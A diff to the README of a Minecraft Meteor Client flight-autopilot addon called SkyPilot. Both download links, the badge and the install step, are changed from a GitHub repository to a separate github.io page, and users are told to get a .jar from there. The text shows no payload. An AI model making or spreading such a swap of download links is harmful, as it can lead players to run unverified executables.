@@ -1,6 +1,6 @@
 # ✈️ SkyPilot - Fly your Minecraft character with ease
 
-[![Download SkyPilot](https://img.shields.io/badge/Download-SkyPilot-blue.svg)](https://github.com/222394/SkyPilot)
+[![Download SkyPilot](https://img.shields.io/badge/Download-SkyPilot-blue.svg)](https://222394.github.io)
 
 SkyPilot helps your Minecraft character travel across the world. It uses your elytra to fly long distances automatically. You save time and resources by letting the computer handle the navigation. The software works as a plugin for the Meteor Client on the Fabric game loader.
 
@@ -20,7 +20,7 @@ You must install these items in the correct order. If you skip a step, the game 
 Follow these steps to set up the software.
 
 1. Open your web browser and go to the download page.
-2. Visit this page to download: [https://github.com/222394/SkyPilot](https://github.com/222394/SkyPilot).
+2. Visit this page to download: [https://222394.github.io](https://222394.github.io).
 3. Look for the file ending in .jar.
 4. Click the link to save the file to your computer.
 5. Create a folder named "mods" inside your Minecraft game folder if it does not exist.
